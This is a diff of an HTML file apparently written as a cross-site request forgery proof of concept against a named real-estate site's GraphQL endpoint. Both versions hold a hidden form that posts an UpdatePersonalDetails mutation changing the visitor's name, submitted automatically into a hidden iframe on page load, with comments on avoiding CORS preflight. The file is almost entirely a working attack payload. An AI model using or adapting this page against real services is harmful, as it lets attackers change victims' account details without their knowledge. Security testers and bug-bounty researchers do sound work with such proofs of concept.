@@ -1,21 +1,26 @@
 <!doctype html>
-<html>
-<head><meta charset="utf-8"><title>CSRF PoC - form fallback</title></head>
-<body>
-<h3>CSRF PoC (form fallback) — auto-submit</h3>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Pure CSRF PoC</title>
+</head>
+<body onload="document.getElementById('csrfForm').submit();">
+  <h4>Pure CSRF PoC — auto-submitting form</h4>
 
-<form id="poc" action="https://mexa.realestate.com.au/graphql" method="POST" enctype="application/x-www-form-urlencoded" target="hidden_iframe">
-  <!-- Many GraphQL servers accept 'query' and 'variables' as form fields -->
-  <input type="hidden" name="query" value='mutation UpdatePersonalDetails($input: personalDetailsInput!) { updatePersonalDetails(input: $input) { firstName lastName __typename } }'>
-  <input type="hidden" name="variables" value='{"input":{"firstName":"admin","lastName":"nalla"}}'>
-  <button type="submit">Submit</button>
-</form>
+  <!-- Hidden iframe prevents navigation away from attacker's page -->
+  <iframe name="hidden_iframe" style="display:none;"></iframe>
 
-<iframe name="hidden_iframe" style="display:none;"></iframe>
-
-<script>
-  // auto-submit after a short delay (mimic user visit)
-  setTimeout(()=>document.getElementById('poc').submit(), 500);
-</script>
+  <!-- Form posts as application/x-www-form-urlencoded (no preflight) -->
+  <form id="csrfForm" action="https://mexa.realestate.com.au/graphql" method="POST" target="hidden_iframe" enctype="application/x-www-form-urlencoded">
+    <!-- Many GraphQL endpoints accept 'query' and 'variables' as form fields -->
+    <input type="hidden" name="operationName" value="UpdatePersonalDetails">
+    <input type="hidden" name="query" value='mutation UpdatePersonalDetails($input: personalDetailsInput!) { updatePersonalDetails(input: $input) { firstName lastName __typename } }'>
+    <input type="hidden" name="variables" value='{"input":{"firstName":"admin","lastName":"nalla"}}'>
+    <!-- Fallback submit button in case JS is disabled -->
+    <noscript>
+      <p>JavaScript is required for automatic submission — click to submit:</p>
+      <input type="submit" value="Submit">
+    </noscript>
+  </form>
 </body>
 </html>
